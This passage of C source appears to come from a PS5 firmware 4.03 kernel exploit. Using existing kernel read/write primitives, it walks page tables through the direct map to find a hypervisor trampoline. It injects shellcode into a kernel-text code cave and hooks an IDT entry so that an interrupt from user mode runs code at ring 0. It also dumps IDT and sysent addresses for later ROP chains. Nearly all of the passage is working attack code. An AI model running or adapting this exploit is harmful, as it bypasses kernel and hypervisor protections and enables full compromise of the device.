     * execution on FW 4.03 (IDT hooking for int1 / int13).
     */
    if (first_qword == 0) {
        printf("\n[*] Step 4b: SYSINIT/MOD_LOAD did not fire — trying IDT invocation...\n");

        /* ── 4b-1: Locate hv_idt_trampoline in kernel memory ── */

        /* Machine code signature of hv_idt_trampoline.
         * The function is: push rax..r11, xor edi,edi, call hv_init,
         * pop r11..rax, iretq.  We match the prefix and suffix around
         * the 5-byte relative call (which varies after relocation). */
        static const uint8_t tramp_prefix[] = {
            0x50, 0x51, 0x52, 0x56, 0x57,               /* push rax,rcx,rdx,rsi,rdi */
            0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, /* push r8,r9,r10,r11 */
            0x31, 0xff                                   /* xor edi,edi */
        };
        static const uint8_t tramp_suffix[] = {
            0x41, 0x5b, 0x41, 0x5a, 0x41, 0x59, 0x41, 0x58, /* pop r11,r10,r9,r8 */
            0x5f, 0x5e, 0x5a, 0x59, 0x58,               /* pop rdi,rsi,rdx,rcx,rax */
            0x48, 0xcf                                   /* iretq */
        };
        const int suffix_off = 0x14;  /* offset of suffix within trampoline */

        printf("[*] g_kdata_base=0x%lx  g_ktext_base=0x%lx  g_dmap_base=0x%lx\n",
               (unsigned long)g_kdata_base, (unsigned long)g_ktext_base,
               (unsigned long)g_dmap_base);

        /* ── kldstat-directed check ──
         * If kldstat reported a module base address, try reading directly
         * from there first (saves the expensive full scan). */
        uint64_t trampoline_kva = 0;
        uint8_t hdr[64];

        if (kfs.address != 0) {
            printf("[*] Trying kldstat-reported base 0x%lx...\n",
                   (unsigned long)kfs.address);
            uint64_t mod_pa = va_to_pa_quiet(kfs.address);
            if (mod_pa != 0) {
                /* Read via DMAP to avoid XOM issues */
                if (kernel_copyout(g_dmap_base + mod_pa, hdr, sizeof(hdr)) == 0) {
                    printf("    First 16 bytes: ");
                    for (int i = 0; i < 16; i++) printf("%02x ", hdr[i]);
                    printf("\n");
                    if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
                        memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
                        trampoline_kva = kfs.address;
                        printf("[+] Trampoline found at kldstat base 0x%lx!\n",
                               (unsigned long)trampoline_kva);
                    }
                }
            } else {
                printf("    Page not mapped in kernel page table.\n");
            }
        }

        /* ── DMAP readability test for ktext (XOM diagnostic) ── */
        if (trampoline_kva == 0) {
            uint64_t kt_pa = va_to_pa_quiet(g_ktext_base);
            if (kt_pa != 0) {
                uint8_t kt_hdr[16];
                int kt_ok = kernel_copyout(g_dmap_base + kt_pa, kt_hdr, 16);
                printf("[*] XOM test: ktext PA=0x%lx, DMAP read %s, bytes: ",
                       (unsigned long)kt_pa, kt_ok == 0 ? "OK" : "FAIL");
                if (kt_ok == 0)
                    for (int i = 0; i < 16; i++) printf("%02x ", kt_hdr[i]);
                printf("\n");
            }
        }

        /* ── XOM-safe FAST hierarchical scan ──
         *
         * We CANNOT kernel_copyout arbitrary kernel VAs (XOM pages cause
         * NPT fault → kernel panic).  Instead we walk the page tables
         * via DMAP and read page content via DMAP.
         *
         * For speed we walk the 4-level page tables hierarchically:
         *   - Skip unmapped 512GB regions (PML4 not present)
         *   - Skip unmapped 1GB regions   (PDPT not present)
         *   - Skip unmapped 2MB regions   (PD not present)
         *   - For mapped 2MB: bulk-read the PT page (512 entries, 4KB)
         *     in ONE kernel_copyout, then iterate locally
         *
         * This turns ~1M kernel_copyouts into ~500 for a mostly-unmapped
         * 1GB range.
         */

        uint64_t total_2mb_checked = 0, total_2mb_mapped = 0;
        uint64_t total_pages_mapped = 0;

        /* Scan ranges */
        struct { uint64_t start, end; const char *label; } ranges[4];
        int nranges = 0;

        /* Range 1: full kernel heap (kdata+32MB → end of VA space)
         * ALLPROC is at kdata+0x27EDCB8 (~40MB), so BSS extends
         * at least that far.  virtual_avail (heap start) is after BSS.
         * Start at kdata+32MB; scan to near the top of the canonical
         * address space.  The hierarchical walker skips unmapped 512GB/
         * 1GB/2MB regions instantly, so this is fast despite the huge
         * VA range. */
        {
            uint64_t s = g_kdata_base + 0x2000000;  /* +32MB */
            uint64_t e = 0xFFFFFFFFFFFFF000ULL;     /* near top of VA */
            if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "kdata→top"}; }
        }
        /* Range 2: DMAP end → kernel text */
        {
            uint64_t s = g_dmap_base + 0x200000000ULL;
            uint64_t e = g_ktext_base;
            if (e > s && e - s > 0x40000000ULL) s = e - 0x40000000ULL;
            if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "DMAP→ktext gap"}; }
        }
        /* Range 3: below DMAP */
        {
            uint64_t s = 0xFFFF800000000000ULL;
            uint64_t e = g_dmap_base;
            if (e > s && e - s > 0x40000000ULL) s = e - 0x40000000ULL;
            if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "below DMAP"}; }
        }

        for (int ri = 0; ri < nranges && trampoline_kva == 0; ri++) {
            uint64_t rs = ranges[ri].start, re = ranges[ri].end;
            printf("[*] Scan %d/%d (%s): 0x%lx → 0x%lx (%luMB)\n",
                   ri + 1, nranges, ranges[ri].label,
                   (unsigned long)rs, (unsigned long)re,
                   (unsigned long)((re - rs) >> 20));

            /* Walk page tables hierarchically, 2MB at a time */
            uint64_t va = rs & ~0x1FFFFFULL; /* align down to 2MB */

            for (; va < re && trampoline_kva == 0; ) {
                /* --- PML4 (512GB granularity) --- */
                uint64_t pml4e;
                kernel_copyout(g_dmap_base + g_cr3_phys +
                               ((va >> 39) & 0x1FF) * 8, &pml4e, 8);
                if (!(pml4e & PTE_PRESENT)) {
                    uint64_t next = (va + (1ULL << 39)) & ~((1ULL << 39) - 1);
                    if (next <= va) break; /* overflow */
                    va = next;
                    continue;
                }

                /* --- PDPT (1GB granularity) --- */
                uint64_t pdpte;
                kernel_copyout(g_dmap_base + (pml4e & PTE_PA_MASK) +
                               ((va >> 30) & 0x1FF) * 8, &pdpte, 8);
                if (!(pdpte & PTE_PRESENT)) {
                    uint64_t next = (va + (1ULL << 30)) & ~((1ULL << 30) - 1);
                    if (next <= va) break;
                    va = next;
                    continue;
                }
                if (pdpte & PTE_PS) {
                    /* 1GB huge page (typically DMAP itself) — skip */
                    uint64_t next = (va + (1ULL << 30)) & ~((1ULL << 30) - 1);
                    if (next <= va) break;
                    va = next;
                    continue;
                }

                /* --- PD (2MB granularity) --- */
                uint64_t pde;
                kernel_copyout(g_dmap_base + (pdpte & PTE_PA_MASK) +
                               ((va >> 21) & 0x1FF) * 8, &pde, 8);
                total_2mb_checked++;

                if (!(pde & PTE_PRESENT)) {
                    va += (1ULL << 21);
                    continue;
                }

                if (pde & PTE_PS) {
                    /* 2MB huge page — scan each 4KB offset */
                    total_2mb_mapped++;
                    uint64_t base_pa = pde & 0x000FFFFFFFE00000ULL;
                    uint64_t chunk_start = va & ~0x1FFFFFULL;
                    for (int pi = 0; pi < 512 && trampoline_kva == 0; pi++) {
                        uint64_t page_va = chunk_start + (uint64_t)pi * 0x1000;
                        if (page_va < rs || page_va >= re) continue;
                        total_pages_mapped++;
                        uint64_t pa = base_pa + (uint64_t)pi * 0x1000;
                        if (kernel_copyout(g_dmap_base + pa, hdr, sizeof(hdr)) != 0)
                            continue;
                        if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
                            memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
                            trampoline_kva = page_va;
                        }
                    }
                    va += (1ULL << 21);
                    continue;
                }

                /* --- PT: bulk-read 512 entries (4KB) in ONE kernel_copyout --- */
                total_2mb_mapped++;
                uint64_t pt_entries[512];
                kernel_copyout(g_dmap_base + (pde & PTE_PA_MASK),
                               pt_entries, sizeof(pt_entries));

                uint64_t chunk_start = va & ~0x1FFFFFULL;
                for (int pi = 0; pi < 512 && trampoline_kva == 0; pi++) {
                    uint64_t page_va = chunk_start + (uint64_t)pi * 0x1000;
                    if (page_va < rs || page_va >= re) continue;
                    if (!(pt_entries[pi] & PTE_PRESENT)) continue;
                    total_pages_mapped++;

                    uint64_t pa = pt_entries[pi] & PTE_PA_MASK;
                    if (kernel_copyout(g_dmap_base + pa, hdr, sizeof(hdr)) != 0)
                        continue;
                    if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
                        memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
                        trampoline_kva = page_va;
                    }
                }
                va += (1ULL << 21);
            }

            printf("    2MB chunks: %lu checked, %lu mapped; pages: %lu mapped\n",
                   (unsigned long)total_2mb_checked,
                   (unsigned long)total_2mb_mapped,
                   (unsigned long)total_pages_mapped);
        }

        if (trampoline_kva) {
            printf("[+] FOUND trampoline at VA 0x%lx!\n",
                   (unsigned long)trampoline_kva);
            printf("    bytes: ");
            for (int b = 0; b < 35; b++) printf("%02x ", hdr[b]);
            printf("\n");
        }

        /* Fallback: sentinel scan (also hierarchical + DMAP) */
        if (trampoline_kva == 0) {
            printf("[*] Trampoline not at page start — trying sentinel scan...\n");
            printf("[*] Searching for sentinel 0x%lx\n", (unsigned long)result_kva);

            uint8_t page[4096];
            uint64_t sentinel_va = 0;

            for (int ri = 0; ri < nranges && sentinel_va == 0; ri++) {
                uint64_t rs = ranges[ri].start, re = ranges[ri].end;
                uint64_t va = rs & ~0x1FFFFFULL;

                for (; va < re && sentinel_va == 0; ) {
                    uint64_t pml4e;
                    kernel_copyout(g_dmap_base + g_cr3_phys +
                                   ((va >> 39) & 0x1FF) * 8, &pml4e, 8);
                    if (!(pml4e & PTE_PRESENT)) {
                        uint64_t n = (va + (1ULL<<39)) & ~((1ULL<<39)-1);
                        if (n <= va) break; va = n; continue;
                    }
                    uint64_t pdpte;
                    kernel_copyout(g_dmap_base + (pml4e & PTE_PA_MASK) +
                                   ((va >> 30) & 0x1FF) * 8, &pdpte, 8);
                    if (!(pdpte & PTE_PRESENT) || (pdpte & PTE_PS)) {
                        uint64_t n = (va + (1ULL<<30)) & ~((1ULL<<30)-1);
                        if (n <= va) break; va = n; continue;
                    }
                    uint64_t pde;
                    kernel_copyout(g_dmap_base + (pdpte & PTE_PA_MASK) +
                                   ((va >> 21) & 0x1FF) * 8, &pde, 8);
                    if (!(pde & PTE_PRESENT)) { va += (1ULL<<21); continue; }

                    if (pde & PTE_PS) {
                        uint64_t base_pa = pde & 0x000FFFFFFFE00000ULL;
                        uint64_t cs = va & ~0x1FFFFFULL;
                        for (int pi = 0; pi < 512 && !sentinel_va; pi++) {
                            uint64_t pva = cs + (uint64_t)pi * 0x1000;
                            if (pva < rs || pva >= re) continue;
                            uint64_t pa = base_pa + (uint64_t)pi * 0x1000;
                            if (kernel_copyout(g_dmap_base + pa, page, 4096) != 0) continue;
                            for (int off = 0; off <= 4096 - 8; off += 8) {
                                uint64_t v; memcpy(&v, page + off, 8);
                                if (v == result_kva) {
                                    sentinel_va = pva + off;
                                    printf("[+] Found sentinel at 0x%lx\n", (unsigned long)sentinel_va);
                                }
                            }
                        }
                        va += (1ULL<<21); continue;
                    }

                    uint64_t pt[512];
                    kernel_copyout(g_dmap_base + (pde & PTE_PA_MASK), pt, sizeof(pt));
                    uint64_t cs = va & ~0x1FFFFFULL;
                    for (int pi = 0; pi < 512 && !sentinel_va; pi++) {
                        uint64_t pva = cs + (uint64_t)pi * 0x1000;
                        if (pva < rs || pva >= re) continue;
                        if (!(pt[pi] & PTE_PRESENT)) continue;
                        uint64_t pa = pt[pi] & PTE_PA_MASK;
                        if (kernel_copyout(g_dmap_base + pa, page, 4096) != 0) continue;
                        for (int off = 0; off <= 4096 - 8; off += 8) {
                            uint64_t v; memcpy(&v, page + off, 8);
                            if (v == result_kva) {
                                sentinel_va = pva + off;
                                printf("[+] Found sentinel at 0x%lx\n", (unsigned long)sentinel_va);
                            }
                        }
                    }
                    va += (1ULL<<21);
                }
            }

            if (sentinel_va) {
                /* Search backward from sentinel for trampoline */
                uint64_t slo = (sentinel_va & ~0xFFFULL) - 0x10000;
                for (uint64_t a = slo; a < sentinel_va; a += 0x1000) {
                    uint64_t pa = va_to_pa_quiet(a);
                    if (pa == 0) continue;
                    if (kernel_copyout(g_dmap_base + (pa & ~0xFFFULL),
                                       hdr, sizeof(hdr)) != 0) continue;
                    if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
                        memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
                        trampoline_kva = a;
                        printf("[+] FOUND trampoline at 0x%lx (near sentinel)!\n",
                               (unsigned long)a);
                        break;
                    }
                }
            }
        }

        printf("[*] Scan done: %lu 2MB chunks (%lu mapped), %lu pages mapped\n",
               (unsigned long)total_2mb_checked, (unsigned long)total_2mb_mapped,
               (unsigned long)total_pages_mapped);

        /* ── Step 4c: Direct shellcode injection (if kldload module not found) ──
         *
         * kldload on PS5 creates a kid but does NOT load module code/data
         * into kernel memory (Sony gutted the kernel linker).
         *
         * Fallback: write self-contained MSR-reading shellcode into a ktext
         * code cave, hook an IDT entry, trigger INT from ring 3, then
         * restore everything. On FW 4.03 without GMET, ktext pages are
         * writable via DMAP and executable.
         */
        uint64_t injected_cave_pa = 0;  /* non-zero if we injected shellcode */
        int injected_sc_len = 0;
        uint8_t cave_backup[1024];

        if (trampoline_kva == 0) {
            printf("[-] Trampoline not found in any scan range.\n");
            printf("\n[*] Step 4c: Direct shellcode injection into ktext code cave...\n");

            /* Build MSR-reading shellcode */
            uint8_t shellcode[1024];
            int sc_len = build_msr_shellcode(shellcode, sizeof(shellcode), result_kva);
            printf("[+] Shellcode built: %d bytes\n", sc_len);

            /* Scan ktext for a code cave (consecutive 0xCC / INT3 bytes) */
            printf("[*] Scanning ktext for code cave (need %d bytes of 0xCC)...\n", sc_len);
            uint64_t cave_kva = 0;
            uint64_t cave_pa = 0;
            uint8_t kpage[4096];

            /* Scan first 4MB of ktext for a suitable cave */
            uint64_t kt_scan_start = g_ktext_base;
            uint64_t kt_scan_end = g_ktext_base + 0x400000;
            int best_run = 0;
            uint64_t best_run_kva = 0, best_run_pa = 0;

            for (uint64_t kva = kt_scan_start; kva < kt_scan_end; kva += 0x1000) {
                uint64_t pa = va_to_pa_quiet(kva);
                if (pa == 0) continue;
                if (kernel_copyout(g_dmap_base + pa, kpage, 4096) != 0) continue;

                /* Count consecutive 0xCC bytes in this page */
                int run = 0;
                for (int off = 0; off < 4096; off++) {
                    if (kpage[off] == 0xCC) {
                        run++;
                        if (run >= sc_len && run > best_run) {
                            best_run = run;
                            /* Cave starts at (off - run + 1) */
                            best_run_kva = kva + (off - run + 1);
                            best_run_pa = pa + (off - run + 1);
                        }
                    } else {
                        run = 0;
                    }
                }
            }

            if (best_run >= sc_len) {
                cave_kva = best_run_kva;
                cave_pa = best_run_pa;
                printf("[+] Code cave found: KVA=0x%lx PA=0x%lx (%d bytes of 0xCC)\n",
                       (unsigned long)cave_kva, (unsigned long)cave_pa, best_run);
            } else {
                printf("[-] No suitable code cave found (best run: %d, need %d).\n",
                       best_run, sc_len);
                printf("    Trying kdata region for code cave...\n");

                /* Fallback: scan first 4MB of kdata for 0xCC or 0x00 runs */
                for (uint64_t kva = g_kdata_base; kva < g_kdata_base + 0x400000; kva += 0x1000) {
                    uint64_t pa = va_to_pa_quiet(kva);
                    if (pa == 0) continue;
                    if (kernel_copyout(g_dmap_base + pa, kpage, 4096) != 0) continue;
                    int run = 0;
                    for (int off = 0; off < 4096; off++) {
                        if (kpage[off] == 0xCC || kpage[off] == 0x00) {
                            run++;
                            if (run >= sc_len && run > best_run) {
                                best_run = run;
                                best_run_kva = kva + (off - run + 1);
                                best_run_pa = pa + (off - run + 1);
                            }
                        } else {
                            run = 0;
                        }
                    }
                }
                if (best_run >= sc_len) {
                    cave_kva = best_run_kva;
                    cave_pa = best_run_pa;
                    printf("[+] Code cave in kdata: KVA=0x%lx PA=0x%lx (%d bytes)\n",
                           (unsigned long)cave_kva, (unsigned long)cave_pa, best_run);
                } else {
                    printf("[-] No code cave found anywhere (best: %d bytes).\n", best_run);
                    goto idt_skip;
                }
            }

            /* Check if the cave is in ktext (executable) or kdata (NX).
             * Sony's HV enforces strict W^X via NPT:
             *   ktext pages: execute-only (XOM) — can't read/write
             *   kdata pages: read-write — can't execute
             * If the cave is in kdata, we can write shellcode there but
             * executing it will trigger #NPF → crash.  Skip execution. */
            int cave_in_ktext = (cave_kva >= g_ktext_base &&
                                 cave_kva < g_ktext_base + 0xC00000);
            if (!cave_in_ktext) {
                printf("[!] Code cave is in kdata (0x%lx), NOT ktext.\n",
                       (unsigned long)cave_kva);
                printf("    NPT enforces NX on kdata pages — execution would crash.\n");
                printf("    ktext is XOM (read/write blocked) — can't inject there either.\n");
                printf("    W^X enforcement prevents direct shellcode injection.\n");
                printf("\n[*] Step 4d: Falling back to ring-3 diagnostics...\n");
                goto ring3_fallback;
            }

            /* Save original bytes from code cave */
            kernel_copyout(g_dmap_base + cave_pa, cave_backup, sc_len);
            printf("[*] Saved %d bytes from code cave.\n", sc_len);
            injected_cave_pa = cave_pa;
            injected_sc_len = sc_len;

            /* Write shellcode to code cave via DMAP */
            printf("[*] Writing shellcode to DMAP+0x%lx...\n",
                   (unsigned long)cave_pa);
            kernel_copyin(shellcode, g_dmap_base + cave_pa, sc_len);

            /* Verify write */
            uint8_t verify[16];
            kernel_copyout(g_dmap_base + cave_pa, verify, 16);
            printf("    Verify: ");
            for (int i = 0; i < 16; i++) printf("%02x ", verify[i]);
            printf("\n");
            if (memcmp(verify, shellcode, 16) != 0) {
                printf("[-] Write verification FAILED — DMAP write to ktext blocked?\n");
                goto idt_skip;
            }
            printf("[+] Shellcode written and verified.\n");

            trampoline_kva = cave_kva;
        }

        /* ── IDT hook: common path for both kldload trampoline and injected shellcode ── */

        /* Read IDTR (SIDT is unprivileged on AMD64) */
        struct {
            uint16_t limit;
            uint64_t base;
        } __attribute__((packed)) idtr;
        __asm__ volatile("sidt %0" : "=m"(idtr));
        printf("[*] IDTR: base=0x%lx, limit=0x%x (%u entries)\n",
               (unsigned long)idtr.base, idtr.limit, (idtr.limit + 1) / 16);

        #define HV_IDT_VECTOR 210  /* 0xD2 — well above PIC/APIC range */

        if (((unsigned)(HV_IDT_VECTOR) + 1) * 16 > (unsigned)(idtr.limit + 1)) {
            printf("[-] IDT too small for vector %u.\n", HV_IDT_VECTOR);
            goto idt_skip;
        }

        struct idt_gate {
            uint16_t offset_lo;
            uint16_t selector;
            uint8_t  ist;
            uint8_t  type_attr;
            uint16_t offset_mid;
            uint32_t offset_hi;
            uint32_t reserved;
        } __attribute__((packed));

        uint64_t gate_addr = idtr.base + HV_IDT_VECTOR * sizeof(struct idt_gate);

        /* Save original gate */
        struct idt_gate orig_gate;
        kernel_copyout(gate_addr, &orig_gate, sizeof(orig_gate));

        /* Get kernel CS from #PF handler (vector 14) */
        struct idt_gate ref_gate;
        kernel_copyout(idtr.base + 14 * sizeof(struct idt_gate), &ref_gate, sizeof(ref_gate));
        uint16_t kernel_cs = ref_gate.selector;
        printf("[*] Kernel CS: 0x%04x (from IDT[14])\n", kernel_cs);

        /* Install IDT gate */
        struct idt_gate new_gate;
        memset(&new_gate, 0, sizeof(new_gate));
        new_gate.offset_lo  = (uint16_t)(trampoline_kva & 0xFFFF);
        new_gate.offset_mid = (uint16_t)((trampoline_kva >> 16) & 0xFFFF);
        new_gate.offset_hi  = (uint32_t)(trampoline_kva >> 32);
        new_gate.selector   = kernel_cs;
        new_gate.ist        = 0;
        new_gate.type_attr  = 0xEE;  /* P=1, DPL=3, type=0xE (interrupt gate) */

        printf("[*] Installing IDT[%u] → 0x%lx ...\n",
               HV_IDT_VECTOR, (unsigned long)trampoline_kva);
        kernel_copyin(&new_gate, gate_addr, sizeof(new_gate));

        /* Clear buffer before invocation */
        memset((void *)result_vaddr, 0, KMOD_RESULT_ALLOC_SIZE);

        /* Fire! */
        printf("[*] Triggering INT %u → shellcode → MSR reads...\n", HV_IDT_VECTOR);
        __asm__ volatile("int $210" ::: "memory");
        printf("[+] Returned from ring-0 interrupt handler!\n");

        /* Restore original IDT entry */
        kernel_copyin(&orig_gate, gate_addr, sizeof(orig_gate));
        printf("[*] IDT[%u] restored.\n", HV_IDT_VECTOR);

        /* Restore code cave if we injected shellcode */
        if (injected_cave_pa != 0) {
            kernel_copyin(cave_backup, g_dmap_base + injected_cave_pa, injected_sc_len);
            printf("[*] Code cave bytes restored (%d bytes).\n", injected_sc_len);
        }

        /* Re-check results */
        memcpy(&first_qword, (void *)result_vaddr, sizeof(first_qword));
        if (first_qword != 0)
            printf("[+] Buffer is no longer zero — code execution worked!\n");
        else
            printf("[-] Buffer still zero after INT invocation.\n");

        goto idt_done;

ring3_fallback:
        /* ── Step 4d: Ring-3 diagnostics (W^X prevents code injection) ──
         *
         * HV NPT enforces strict W^X:
         *   ktext: X-only (can execute, can't read/write)
         *   kdata/DMAP: RW (can read/write, can't execute)
         *
         * Without writable+executable pages, we can't inject shellcode.
         * Collect what we can from ring 3 and dump sysent for future ROP. */

        /* 4d-1: sysarch-based FS/GS BASE reads
         * sysarch(2) = syscall 165, subcommands:
         *   128 = AMD64_GET_FSBASE
         *   130 = AMD64_GET_GSBASE */
        {
            #define SYS_sysarch     165
            #define AMD64_GET_FSBASE 128
            #define AMD64_GET_GSBASE 130
            uint64_t fs_base = 0, gs_base = 0;
            int sa_ret;
            sa_ret = syscall(SYS_sysarch, AMD64_GET_FSBASE, &fs_base);
            printf("[*] sysarch(GET_FSBASE): ret=%d, value=0x%lx\n",
                   sa_ret, (unsigned long)fs_base);
            sa_ret = syscall(SYS_sysarch, AMD64_GET_GSBASE, &gs_base);
            printf("[*] sysarch(GET_GSBASE): ret=%d, value=0x%lx\n",
                   sa_ret, (unsigned long)gs_base);
        }

        /* 4d-2: Known values from exploit setup */
        printf("[*] Known from exploit:\n");
        printf("    ktext_base  = 0x%lx\n", (unsigned long)g_ktext_base);
        printf("    kdata_base  = 0x%lx\n", (unsigned long)g_kdata_base);
        printf("    dmap_base   = 0x%lx\n", (unsigned long)g_dmap_base);
        printf("    CR3 (phys)  = 0x%lx\n", (unsigned long)g_cr3_phys);
        fflush(stdout);

        /* 4d-3: IDT handler addresses
         * SIDT is intercepted by PS5 HV (VMCB intercept bit) and kills
         * the process.  Find IDT by scanning kdata via DMAP instead.
         * (Direct kernel_copyout from KVA fails on many kdata pages;
         *  DMAP reads after page table walk always succeed.)
         *
         * IDT = 256 × 16-byte gate descriptors:
         *   +0: uint16 offset_lo   +2: uint16 selector (kernel CS)
         *   +4: uint8 ist          +5: uint8 type_attr (0x8E=int, 0x8F=trap)
         *   +6: uint16 offset_mid  +8: uint32 offset_hi  +12: uint32 reserved(0) */
        {
            printf("[*] Searching kdata for IDT via DMAP (SIDT is HV-intercepted)...\n");
            fflush(stdout);

            uint64_t idt_kva = 0;
            uint16_t idt_sel = 0;
            uint8_t idt_pg[4096];
            int pages_ok = 0, pages_fail = 0;

            /* Scan first 128MB of kdata via DMAP.
             * Relaxed criteria: accept any kernel VA handler (>= 0xffffffff80000000),
             * selector up to 0x80, to account for PS5's custom GDT. */
            int best_run = 0;
            uint64_t best_run_off = 0;
            for (uint64_t off = 0; off < 0x8000000 && !idt_kva; off += 4096) {
                /* Progress every 16MB (4096 pages) */
                if ((off & 0xFFFFFF) == 0 && off > 0) {
                    printf("    IDT scan: %luMB/%dMB (%d pages OK, %d fail)\n",
                           (unsigned long)(off >> 20), 128, pages_ok, pages_fail);
                    fflush(stdout);
                }
                uint64_t kva = g_kdata_base + off;
                uint64_t pa = va_to_pa_quiet(kva);
                if (!pa) { pages_fail++; continue; }
                if (kernel_copyout(g_dmap_base + pa, idt_pg, 4096) != 0) {
                    pages_fail++; continue;
                }
                pages_ok++;

                for (int boff = 0; boff <= 4096 - 16*8 && !idt_kva; boff += 16) {
                    int good = 0;
                    uint16_t first_sel = 0;
                    for (int e = 0; e < 8; e++) {
                        uint8_t *g = &idt_pg[boff + e * 16];
                        uint16_t lo, sel, mid;
                        uint32_t hi, rsv;
                        uint8_t type_attr;
                        memcpy(&lo,  g + 0, 2);
                        memcpy(&sel, g + 2, 2);
                        type_attr = g[5];
                        memcpy(&mid, g + 6, 2);
                        memcpy(&hi,  g + 8, 4);
                        memcpy(&rsv, g + 12, 4);
                        uint64_t h = (uint64_t)lo | ((uint64_t)mid << 16) |
                                     ((uint64_t)hi << 32);
                        /* Relaxed: any kernel VA, selector up to 0x80 */
                        if (h >= 0xffffffff80000000ULL &&
                            (type_attr == 0x8E || type_attr == 0x8F) &&
                            sel != 0 && sel <= 0x80 && (sel & 7) == 0 &&
                            rsv == 0) {
                            good++;
                            if (first_sel == 0) first_sel = sel;
                        }
                    }
                    if (good > best_run) {
                        best_run = good;
                        best_run_off = off + boff;
                    }
                    if (good >= 6) {
                        idt_kva = kva + boff;
                        idt_sel = first_sel;
                    }
                }
            }

            printf("    (scanned %d pages, %d unmapped, best gate run=%d at kdata+0x%lx)\n",
                   pages_ok, pages_fail, best_run, (unsigned long)best_run_off);

            if (idt_kva) {
                printf("[+] IDT found at kdata+0x%lx (KVA 0x%lx), kernel CS=0x%x\n",
                       (unsigned long)(idt_kva - g_kdata_base),
                       (unsigned long)idt_kva, idt_sel);

                static const struct { int vec; const char *name; } idt_vecs[] = {
                    {0, "#DE"}, {1, "#DB"}, {2, "NMI"}, {3, "#BP"},
                    {6, "#UD"}, {8, "#DF"}, {13, "#GP"}, {14, "#PF"},
                    {32, "Timer"}, {128, "int80"},
                };
                for (unsigned i = 0; i < sizeof(idt_vecs)/sizeof(idt_vecs[0]); i++) {
                    int v = idt_vecs[i].vec;
                    uint64_t gate_kva = idt_kva + v * 16;
                    uint64_t gate_pa = va_to_pa_quiet(gate_kva);
                    uint8_t g[16];
                    if (!gate_pa || kernel_copyout(g_dmap_base + gate_pa, g, 16) != 0) {
                        printf("    IDT[%3d] %-6s — read failed\n", v, idt_vecs[i].name);
                        continue;
                    }
                    uint16_t lo, sel, mid;
                    uint32_t hi;
                    memcpy(&lo,  g + 0, 2);
                    memcpy(&sel, g + 2, 2);
                    memcpy(&mid, g + 6, 2);
                    memcpy(&hi,  g + 8, 4);
                    uint64_t handler = (uint64_t)lo | ((uint64_t)mid << 16) |
                                       ((uint64_t)hi << 32);
                    printf("    IDT[%3d] %-6s = 0x%lx (ktext+0x%lx) sel=0x%x\n",
                           v, idt_vecs[i].name, (unsigned long)handler,
                           (unsigned long)(handler - g_ktext_base), sel);
                }
            } else {
                printf("[-] IDT not found in kdata (first 128MB).\n");
            }
            fflush(stdout);
        }

        /* Variables hoisted for use by sysent dump, verification, and
         * ring-0 execution */
        int sysent_found = 0;
        int sysent_verified = 0;
        uint64_t sysent_kva = 0;

        /* 4d-4: Sysent table dump (first 32 entries for ROP planning) */
        {
            /* struct sysent (0x30 = 48 bytes, confirmed via etaHEN kexec.h):
             *   0x00: uint32_t n_arg
             *   0x04: uint32_t pad
             *   0x08: uint64_t sy_call       (function pointer in ktext)
             *   0x10: uint64_t sy_auevent
             *   0x18: uint64_t sy_systrace_args
             *   0x20: uint32_t sy_entry
             *   0x24: uint32_t sy_return
             *   0x28: uint32_t sy_flags
             *   0x2C: uint32_t sy_thrcnt
             *
             * sysentvec for FW 4.03 is at kdata+0xd11bb8 (from etaHEN offsets).
             *
             * IMPORTANT: etaHEN daemon's pause_resume_kstuff() writes
             * 0xdeb7 or 0xffff at sysentvec+14, which corrupts the
             * top 16 bits of sv_table (at struct offset 8, bytes 14-15).
             * We must reconstruct the canonical pointer by forcing
             * bits 48-63 back to 0xFFFF. */
            printf("[*] Looking up sysent via known sysentvec offset...\n");
            fflush(stdout);

            #define SYSENT_STRIDE 0x30  /* 48 bytes per entry */

            /* Read sysentvec at known offset via DMAP */
            uint64_t sysentvec_kva = g_kdata_base + 0xd11bb8;
            uint64_t sysentvec_pa = va_to_pa_quiet(sysentvec_kva);

            if (sysentvec_pa) {
                uint8_t svec[24];
                kernel_copyout(g_dmap_base + sysentvec_pa, svec, 24);

                /* Dump raw bytes for diagnostics */
                printf("    sysentvec raw (24 bytes at PA 0x%lx):\n      ",
                       (unsigned long)sysentvec_pa);
                for (int i = 0; i < 24; i++)
                    printf("%02x ", svec[i]);
                printf("\n");

                int32_t sv_size;
                uint64_t sv_table_raw;
                memcpy(&sv_size, svec, 4);
                memcpy(&sv_table_raw, svec + 8, 8);

                /* etaHEN daemon corrupts bytes 14-15 (top 16 bits of sv_table)
                 * with 0xdeb7 (unpaused) or 0xffff (paused).
                 * Reconstruct canonical kernel pointer. */
                uint64_t sv_table = (sv_table_raw & 0x0000FFFFFFFFFFFFULL)
                                  | 0xFFFF000000000000ULL;

                printf("    sv_size=%d, sv_table_raw=0x%lx → fixed=0x%lx\n",
                       sv_size, (unsigned long)sv_table_raw,
                       (unsigned long)sv_table);

                /* Also check offset-14 toggle value */
                uint16_t toggle;
                memcpy(&toggle, svec + 14, 2);
                printf("    offset+14 toggle=0x%04x (%s)\n", toggle,
                       toggle == 0xdeb7 ? "unpaused/etaHEN active" :
                       toggle == 0xffff ? "paused/normal" : "unknown");

                if (sv_size >= 300 && sv_size <= 1024 &&
                    sv_table >= g_kdata_base &&
                    sv_table < g_kdata_base + 0x4000000) {
                    sysent_kva = sv_table;
                    sysent_found = 1;
                    printf("[+] Sysent table at KVA 0x%lx (kdata+0x%lx), %d entries\n",
                           (unsigned long)sysent_kva,
                           (unsigned long)(sysent_kva - g_kdata_base), sv_size);
                } else {
                    printf("    Reconstructed sv_table out of range — trying scan.\n");
                }
            } else {
                printf("    sysentvec VA 0x%lx not mapped — trying scan.\n",
                       (unsigned long)sysentvec_kva);
            }

